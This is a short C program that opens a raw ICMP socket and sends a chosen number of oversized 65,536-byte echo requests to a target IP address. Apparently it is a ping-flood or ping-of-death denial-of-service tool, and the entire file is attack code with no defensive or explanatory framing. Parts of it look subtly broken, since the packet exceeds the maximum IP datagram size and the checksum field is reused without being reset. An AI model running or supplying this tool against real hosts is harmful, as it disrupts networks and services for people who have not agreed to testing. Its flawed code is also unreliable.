#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>


#define PACKET_SIZE 65536


unsigned short checksum(unsigned short *buf, int nwords) {
    unsigned long sum;
    for (sum = 0; nwords > 0; nwords--)
        sum += *buf++;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return ~sum;
}


int main(int argc, char *argv[]) {
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <target_ip> <count>\n", argv[0]);
        return 1;
    }

    char *target_ip = argv[1];
    int count = atoi(argv[2]);

    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sockfd < 0) {
        perror("socket");
        return 1;
    }


    struct sockaddr_in dest;
    memset(&dest, 0, sizeof(dest));
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = inet_addr(target_ip);


    char packet[PACKET_SIZE];
    struct icmphdr *icmp = (struct icmphdr *)packet;
    icmp->type = ICMP_ECHO;
    icmp->code = 0;
    icmp->checksum = 0;
    icmp->un.echo.id = getpid();
    icmp->un.echo.sequence = 0;

    memset(packet + sizeof(struct icmphdr), 0, PACKET_SIZE - sizeof(struct icmphdr));

    for (int i = 0; i < count; i++) {
        icmp->un.echo.sequence = i + 1;
        icmp->checksum = checksum((unsigned short *)icmp, PACKET_SIZE / 2);

        if (sendto(sockfd, packet, PACKET_SIZE, 0, (struct sockaddr *)&dest, sizeof(dest)) < 0) {
            perror("sendto");
            break;
        }
    }


    close(sockfd);
    return 0;
}
